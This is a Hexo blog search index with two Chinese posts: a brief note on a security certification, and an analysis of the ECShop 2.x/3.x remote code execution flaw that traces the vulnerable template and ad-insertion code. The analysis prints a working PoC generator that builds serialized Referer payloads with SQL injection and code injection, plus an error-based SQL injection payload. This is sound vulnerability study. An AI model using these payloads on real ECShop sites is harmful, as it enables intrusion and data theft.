<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>360网络安全职业认证 - CSSJ</title>
    <url>/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<html><head></head><body><p>&#x5B66;&#x6821;&#x8FD9;&#x8FB9;&#x653F;&#x7B56;&#x662F;&#x5927;&#x4E8C;&#x4E4B;&#x524D;&#x53EF;&#x4EE5;&#x514D;&#x8D39;&#x8003;&#x8BD5;&#x3002;&#x542B;&#x91D1;&#x91CF;&#x672A;&#x77E5;&#xFF0C;&#x7559;&#x4E2A;&#x7EAA;&#x5FF5;&#x3002;</p>
<a id="more"></a>



<br>



<p><img src="/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/image-20201113164910961.png" alt="image-20201113164910961"></p>
</body></html>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ECShop 3.6.x RCE 漏洞分析</title>
    <url>/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x4E24;&#x5E74;&#x524D;&#x4E00;&#x4E2A;&#x5229;&#x7528;&#x5F88;&#x5DE7;&#x5999;&#x7684;&#x5168;&#x7248;&#x672C;&#x7684; RCE &#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x5BF9;&#x6B64;&#x8FDB;&#x884C;&#x590D;&#x73B0;&#x5206;&#x6790;&#x548C;&#x5B66;&#x4E60;</p>
<a id="more"></a>

<p>&#x8FD1;&#x65E5;&#x7B14;&#x8005;&#x53C8;&#x770B;&#x5230;&#x4E86; 4.0 &#x7248;&#x672C;&#x7684; SQL &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#xFF0C;&#x4E00;&#x4E2A; nday &#x5230; 0day &#x6316;&#x6398;&#x7684;&#x5229;&#x7528;&#x601D;&#x8DEF;&#x3002;&#x672C;&#x60F3;&#x8FDE;&#x7740;&#x4E00;&#x8D77;&#x590D;&#x73B0;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x662F;&#x6CA1;&#x6709;&#x627E;&#x5230; 4.0&#x7684;&#x5B89;&#x88C5;&#x5305;</p>
<h1 id="3-6-x-RCE"><a href="#3-6-x-RCE" class="headerlink" title="3.6.x RCE"></a>3.6.x RCE</h1><h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2><p>Vulhub&#x4E0A;&#x5DF2;&#x7ECF;&#x6709;&#x73B0;&#x6210;&#x7684;&#x5229;&#x7528;&#x811A;&#x672C;</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$shell = bin2hex(<span class="hljs-string">&quot;{\$asd&apos;];phpinfo\t();//}xxx&quot;</span>);</span><br><span class="line">$id = <span class="hljs-string">&quot;-1&apos; UNION/*&quot;</span>;</span><br><span class="line">$arr = [</span><br><span class="line">    &quot;num&quot; =&gt; sprintf(&apos;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&apos;, bin2hex($id), $shell),</span><br><span class="line">    &quot;id&quot; =&gt; $id</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$s = serialize($arr);</span><br><span class="line"></span><br><span class="line">$hash3 = <span class="hljs-string">&apos;45ea207d7a2b68c49582d2d22adf953a&apos;</span>;</span><br><span class="line">$hash2 = <span class="hljs-string">&apos;554fcae493e564ee0dc75bdf2ebf94ca&apos;</span>;</span><br><span class="line"></span><br><span class="line">echo <span class="hljs-string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line">echo <span class="hljs-string">&quot;{$hash2}ads|{$s}{$hash2}&quot;</span>;</span><br><span class="line">echo <span class="hljs-string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line">echo <span class="hljs-string">&quot;{$hash3}ads|{$s}{$hash3}&quot;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175028636.png" alt="image-20201124175028636"></p>
<h2 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h2><h3 id="&#x89E6;&#x53D1;&#x6D41;&#x7A0B;"><a href="#&#x89E6;&#x53D1;&#x6D41;&#x7A0B;" class="headerlink" title="&#x89E6;&#x53D1;&#x6D41;&#x7A0B;"></a>&#x89E6;&#x53D1;&#x6D41;&#x7A0B;</h3><p>&#x5B9A;&#x4F4D;&#x89E6;&#x53D1;&#x70B9; <code>/user.php</code>&#xFF1A;</p>
<p>&#x5BF9; <code>$back_act</code> &#x9644;&#x503C;&#xFF0C; &#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x76F8;&#x5F53;&#x4E8E; <code>Referer</code>  &#x5B57;&#x6BB5;&#x4E0D;&#x5305;&#x542B; <code>user.php</code> &#x7684;&#x524D;&#x63D0;&#x4E0B;&#x80FD;&#x8FBE;&#x5230; <code>$back_act</code> &#x7684;&#x53D8;&#x91CF;&#x53EF;&#x63A7;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png" alt="image-20201124175854342"></p>
<p>&#x53D8;&#x91CF;&#x4F20;&#x9012;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183225043.png" alt="image-20201124183225043"></p>
<p>&#x8DDF;&#x8FDB;&#xFF0C;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x53D8;&#x91CF;&#x6CE8;&#x518C;&#x3002;&#x5C06; <code>$back_act</code> &#x6CE8;&#x518C;&#x6210;&#x4E86; <code>$this-&gt;_var[$tpl_var]</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183504327.png" alt="image-20201124183504327"></p>
<p>&#x4E0B;&#x9762;&#x8DDF;&#x8FDB; <code>display</code> &#xFF0C;<code>/includes/cls_template.php</code> &#x4E3A;&#x6A21;&#x7248;&#x7C7B;&#xFF0C; <code>display</code> &#x4E3A;&#x9875;&#x9762;&#x663E;&#x793A;&#x51FD;&#x6570;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124184751849.png" alt="image-20201124184751849"></p>
<p>&#x8DDF;&#x8FDB; <code>fetch</code>&#xFF0C;&#x4E3B;&#x8981;&#x4E3A;&#x6A21;&#x7248;&#x5904;&#x7406;&#x6587;&#x4EF6;&#x3002;&#x5904;&#x7406;&#x7684; <code>filename</code> &#x4E3A; <code>user_passport.dwt</code></p>
<p>&#x5176;&#x4E2D;&#x8FD9;&#x91CC;&#x4F1A;&#x89E6;&#x53D1;&#x7F16;&#x8BD1;&#x6A21;&#x7248;&#x51FD;&#x6570;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124185436789.png" alt="image-20201124185436789"></p>
<p>&#x8DDF;&#x8FDB;<code>make_compiled</code> , &#x4F1A;&#x8FD4;&#x56DE;&#x5904;&#x7406;&#x597D;&#x7684; hmtl &#x5185;&#x5BB9;&#x3002;&#x7136;&#x540E;&#x9644;&#x503C;&#x7ED9; <code>out</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190021547.png" alt="image-20201124190021547"></p>
<p>&#x4E4B;&#x540E;&#x4F1A;&#x8FD4;&#x56DE; <code>display</code> &#x51FD;&#x6570;&#x7EE7;&#x7EED;&#x5904;&#x7406;&#x672A;&#x5904;&#x7406;&#x7684;&#x6D41;&#x7A0B;&#xFF0C;<code>strpos</code> &#x5224;&#x65AD;&#x8FD9;&#x91CC;&#x662F;&#x81F3;&#x5173;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x70B9;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4E4B;&#x540E;&#x9700;&#x8981;&#x8C03;&#x7528;&#x7684; <code>insert_mod</code> &#x3002;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190519184.png" alt="image-20201124190519184"></p>
<p><code>$this-&gt;_echash</code> &#x662F;&#x4E4B;&#x524D; <code>/includes/cls_template.php</code> &#x5B9A;&#x4E49;&#x597D;&#x7684;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> $_echash        = <span class="hljs-string">&apos;45ea207d7a2b68c49582d2d22adf953a&apos;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7136;&#x540E;&#x8FDB;&#x884C; <code>foreach</code> &#x5FAA;&#x73AF;&#x6267;&#x884C;  <code>insert_mod</code> </p>
<p>&#x8FD9;&#x91CC; <code>if (($key % 2) == 1)</code> &#x7684;&#x4F5C;&#x7528;&#x770B;&#x4E00;&#x4E0B;&#x88AB;&#x5207;&#x5272;&#x7684; <code>k</code> &#x5C31;&#x77E5;&#x9053;&#x4E86;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191853741.png" alt="image-20201124191853741"></p>
<p>&#x8DDF;&#x8FDB;  <code>insert_mod</code>&#xFF0C; &#x4E3B;&#x8981;&#x5B8C;&#x6210;&#x8FD9;&#x51E0;&#x4EF6;&#x4E8B;&#x513F;&#xFF1A;</p>
<ol>
<li>&#x7528; <code>|</code> &#x5206;&#x5272;&#x53D8;&#x91CF;</li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316; <code>para</code></li>
<li><code>fun</code> &#x53D8;&#x91CF;&#x7684;&#x62FC;&#x63A5;</li>
<li>&#x8FD4;&#x56DE; <code>$fun($para)</code></li>
</ol>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191423906.png" alt="image-20201124191423906"></p>
<p>&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x503C;&#x5F15;&#x53D1;&#x601D;&#x8003;&#xFF0C; &#x6211;&#x4EEC;&#x76EE;&#x524D;&#x5F97;&#x5230;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#xFF1A;<code>$fun($para)</code> </p>
<p><code>$fun($para)</code> &#x7684; <code>fun</code> &#x6765;&#x81EA; <code>insert_</code> + &#x88AB; explode &#x7684;&#x524D;&#x534A;&#x90E8;&#x5206;</p>
<p><code>para</code> &#x6765;&#x81EA;&#x88AB; explode &#x7684;&#x540E;&#x534A;&#x90E8;&#x5206;</p>
<p>&#x90A3;&#x4E48;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x6267;&#x884C;&#x62FC;&#x63A5;&#x4E86;  <code>insert_</code>  &#x7684;&#x53EF;&#x63A7;&#x51FD;&#x6570;</p>
<h3 id="&#x95EE;&#x9898;&#x5256;&#x6790;"><a href="#&#x95EE;&#x9898;&#x5256;&#x6790;" class="headerlink" title="&#x95EE;&#x9898;&#x5256;&#x6790;"></a>&#x95EE;&#x9898;&#x5256;&#x6790;</h3><ul>
<li>&#x95EE;&#x9898;&#x4E00;</li>
</ul>
<p>&#x9996;&#x5148;&#x662F; <code>$back_act</code> &#x9644;&#x503C;&#x65B9;&#x5F0F;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x91C7;&#x7528; Referer &#x5934;&#x4F20;&#x5165;&#xFF1F;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png" alt="image-20201124175854342"></p>
<p>&#x5176;&#x5B9E;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5176;&#x4ED6;&#x9644;&#x503C;&#x65B9;&#x6CD5;&#xFF1A;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">emample:</span><br><span class="line">$back_act = <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;back_act&apos;</span>]) ? trim($_POST[<span class="hljs-string">&apos;back_act&apos;</span>]) : <span class="hljs-string">&apos;&apos;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7A76;&#x5176;&#x6838;&#x5FC3;&#x539F;&#x56E0;&#xFF1A;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125153706202.png" alt="image-20201125153706202"></p>
<p><code>/includes/init.php</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154151298.png" alt="image-20201125154151298"></p>
<p><code>addslashes_deep</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154200642.png" alt="image-20201125154200642"></p>
<hr>
<ul>
<li>&#x95EE;&#x9898;&#x4E8C;</li>
</ul>
<p>&#x4E3A;&#x4EC0;&#x4E48;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#xFF1F;</p>
<p><code>/includes/cls_template.php#insert_mod</code> &#x5148;&#x5206;&#x5272;&#xFF0C;&#x518D;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125192053092.png" alt="image-20201125192053092"></p>
<hr>
<ul>
<li>&#x95EE;&#x9898;&#x4E09;</li>
</ul>
<p>&#x5982;&#x4F55;bypass</p>
<p>&#x4E3B;&#x8981;&#x8FC7;&#x6EE4;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smarty_prefilter_preCompile</span><span class="hljs-params">($source)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line"></span><br><span class="line">      &#xB7;&#xB7;&#xB7;</span><br><span class="line">        </span><br><span class="line">        $pattern = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;/&lt;!--[^&gt;|\n]*?({.+?})[^&lt;|{|\n]*?--&gt;/&apos;</span>, <span class="hljs-comment">// &#x66FF;&#x6362;smarty&#x6CE8;&#x91CA;</span></span><br><span class="line">            <span class="hljs-string">&apos;/&lt;!--[^&lt;|&gt;|{|\n]*?--&gt;/&apos;</span>,               <span class="hljs-comment">// &#x66FF;&#x6362;&#x4E0D;&#x6362;&#x884C;&#x7684;html&#x6CE8;&#x91CA;</span></span><br><span class="line">            <span class="hljs-string">&apos;/(href=[&quot;|\&apos;])\.\.\/(.*?)([&quot;|\&apos;])/i&apos;</span>,  <span class="hljs-comment">// &#x66FF;&#x6362;&#x76F8;&#x5BF9;&#x94FE;&#x63A5;</span></span><br><span class="line">            <span class="hljs-string">&apos;/((?:background|src)\s*=\s*[&quot;|\&apos;])(?:\.\/|\.\.\/)?(images\/.*?[&quot;|\&apos;])/is&apos;</span>, <span class="hljs-comment">// &#x5728;images&#x524D;&#x52A0;&#x4E0A; $tmp_dir</span></span><br><span class="line">            <span class="hljs-string">&apos;/((?:background|background-image):\s*?url\()(?:\.\/|\.\.\/)?(images\/)/is&apos;</span>, <span class="hljs-comment">// &#x5728;images&#x524D;&#x52A0;&#x4E0A; $tmp_dir</span></span><br><span class="line">            <span class="hljs-string">&apos;/([\&apos;|&quot;])\.\.\//is&apos;</span>, <span class="hljs-comment">// &#x4EE5;../&#x5F00;&#x5934;&#x7684;&#x8DEF;&#x5F84;&#x5168;&#x90E8;&#x4FEE;&#x6B63;&#x4E3A;&#x7A7A;</span></span><br><span class="line">            );</span><br><span class="line">        $replace = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1\2\3&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span> . $tmp_dir . <span class="hljs-string">&apos;\2&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span> . $tmp_dir . <span class="hljs-string">&apos;\2&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span></span><br><span class="line">            );</span><br><span class="line">        <span class="hljs-keyword">return</span> preg_replace($pattern, $replace, $source);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;"><a href="#SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;" class="headerlink" title="SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;"></a>SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;</h3><p>3.x&#x7248;&#x672C;&#x5F15;&#x5165;&#x4E86; <code>/includes/safety.php</code> &#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x6240;&#x4EE5; 3.x &#x7248;&#x672C; &#x7406;&#x8BBA;&#x4E0A;&#x662F;&#x4E0D;&#x5B58;&#x5728; SQL &#x6CE8;&#x5165;&#x7684;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124221247588.png" alt="image-20201124221247588"></p>
<p>&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x5B66;&#x4E60;&#x601D;&#x8DEF;&#xFF0C;&#x8FD8;&#x662F;&#x4E91;&#x590D;&#x73B0;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A; 2.x &#x7248;&#x672C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x3002;</p>
<p>&#x4E4B;&#x524D;&#x5206;&#x6790;&#x5230;&#x5BFB;&#x627E;&#x53EF;&#x63A7;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x8C03;&#x7528;&#x3002;&#x7F51;&#x4E0A;&#x7528;&#x7684;&#x90FD;&#x662F; <code>insert_ads</code> &#x8FD9;&#x4E2A;&#x51FD;&#x6570;</p>
<p>&#x5173;&#x4E8E; SQL &#x6CE8;&#x5165;&#x7684;&#x5229;&#x7528;&#x601D;&#x8003;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;<a href="https://xz.aliyun.com/t/2725" target="_blank" rel="noopener">https://xz.aliyun.com/t/2725</a></p>
<p>&#x6CE8;&#x91CA;&#x6389;&#x4E86; waf &#x76F8;&#x5173;&#x7684;&#x51FD;&#x6570;&#xFF08;&#x7ED5;&#x4E0D;&#x8FC7;&#x53BB;&#xFF09;&#xFF0C;payload &#x5982;&#x4E0B;</p>
<p></p><figure class="highlight hljs"><table><tbody><tr><td class="code"><pre><span class="line">45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:&quot;num&quot;;s:3:&quot;669&quot;;s:2:&quot;id&quot;;s:57:&quot;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&quot;;}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6267;&#x884C;&#x7684;&#x76F8;&#x5E94; SQL &#x8BED;&#x53E5;&#xFF1A;</p>
<p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="hljs-keyword">RAND</span>() <span class="hljs-keyword">AS</span> rnd <span class="hljs-keyword">FROM</span> <span class="hljs-string">`ecshop360`</span>.<span class="hljs-string">`ecs_ad`</span> <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">`ecshop360`</span>.<span class="hljs-string">`ecs_ad_position`</span> <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">ON</span> a.position_id = p.position_id <span class="hljs-keyword">WHERE</span> enabled = <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> start_time &lt;= <span class="hljs-string">&apos;1606229787&apos;</span> <span class="hljs-keyword">AND</span> end_time &gt;= <span class="hljs-string">&apos;1606229787&apos;</span> <span class="hljs-keyword">AND</span> a.position_id = <span class="hljs-string">&apos;1&apos;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">make_set</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&apos;~&apos;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)<span class="hljs-comment">#&apos; ORDER BY rnd LIMIT 669</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124225708206.png" alt="image-20201124225708206"></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>&#x56DE;&#x987E; <code>/includes/lib_insert.php#insert_ads</code>  </p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_ads</span><span class="hljs-params">($arr)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">static</span> $static_res = <span class="hljs-keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($arr[<span class="hljs-string">&apos;num&apos;</span>]) &amp;&amp; $arr[<span class="hljs-string">&apos;num&apos;</span>] != <span class="hljs-number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        $sql  = <span class="hljs-string">&apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos;</span> .</span><br><span class="line">                    <span class="hljs-string">&apos;p.ad_height, p.position_style, RAND() AS rnd &apos;</span> .</span><br><span class="line">                <span class="hljs-string">&apos;FROM &apos;</span> . $GLOBALS[<span class="hljs-string">&apos;ecs&apos;</span>]-&gt;table(<span class="hljs-string">&apos;ad&apos;</span>) . <span class="hljs-string">&apos; AS a &apos;</span>.</span><br><span class="line">                <span class="hljs-string">&apos;LEFT JOIN &apos;</span> . $GLOBALS[<span class="hljs-string">&apos;ecs&apos;</span>]-&gt;table(<span class="hljs-string">&apos;ad_position&apos;</span>) . <span class="hljs-string">&apos; AS p ON a.position_id = p.position_id &apos;</span> .</span><br><span class="line">                <span class="hljs-string">&quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot;</span> . $time . <span class="hljs-string">&quot;&apos; AND end_time &gt;= &apos;&quot;</span> . $time . <span class="hljs-string">&quot;&apos; &quot;</span>.</span><br><span class="line">                    <span class="hljs-string">&quot;AND a.position_id = &apos;&quot;</span> . $arr[<span class="hljs-string">&apos;id&apos;</span>] . <span class="hljs-string">&quot;&apos; &quot;</span> .</span><br><span class="line">                <span class="hljs-string">&apos;ORDER BY rnd LIMIT &apos;</span> . $arr[<span class="hljs-string">&apos;num&apos;</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="hljs-string">&apos;db&apos;</span>]-&gt;GetAll($sql);</span><br><span class="line">    }</span><br><span class="line">    $ads = <span class="hljs-keyword">array</span>();</span><br><span class="line">    $position_style = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($res <span class="hljs-keyword">AS</span> $row)</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">if</span> ($row[<span class="hljs-string">&apos;position_id&apos;</span>] != $arr[<span class="hljs-string">&apos;id&apos;</span>])</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">	</span><br><span class="line">      &#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;</span><br><span class="line">  </span><br><span class="line">    $position_style = <span class="hljs-string">&apos;str:&apos;</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;caching = <span class="hljs-keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;assign(<span class="hljs-string">&apos;ads&apos;</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;caching = $need_cache;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> $val;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x5173;&#x952E;&#x7684;&#x9644;&#x503C;&#xFF0C;<code>$row[&apos;position_style&apos;]</code> &#x6765;&#x81EA;<code>$res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql)</code> &#x67E5;&#x8BE2;&#x540E; <code>foreach</code> &#x904D;&#x5386;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x6709;&#x51E0;&#x4E2A;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#xFF1A;</p>
<ol>
<li>&#x9996;&#x5148;&#x5173;&#x6CE8; <code>$position_style</code>  &#x8FD9;&#x4E2A;&#x53D8;&#x91CF;</li>
<li>&#x5173;&#x6CE8; <code>$row[&apos;position_id&apos;] != $arr[&apos;id&apos;]</code> &#xFF08;&#x76F8;&#x7B49;&#x8C03;&#x7528; <code>$position_style = $row[&apos;position_style&apos;];</code>&#xFF09;</li>
</ol>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125194129600.png" alt="image-20201125194129600"></p>
<p>&#x5728;&#x4E0B;&#x9762;&#x5B8C;&#x6210;&#x62FC;&#x63A5;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120549159.png" alt="image-20201125120549159"></p>
<p>&#x4F1A;&#x8C03;&#x7528;   <code>fetch</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125011036242.png" alt="image-20201125011036242"></p>
<p><code>/includes/cls_template.php</code> 145 &#x884C;&#x662F;&#x4E00;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#x3002;&#x65E0;&#x975E;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;</p>
<ol>
<li><code>fetch_str</code></li>
<li><code>_eval</code></li>
</ol>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120749172.png" alt="image-20201125120749172"></p>
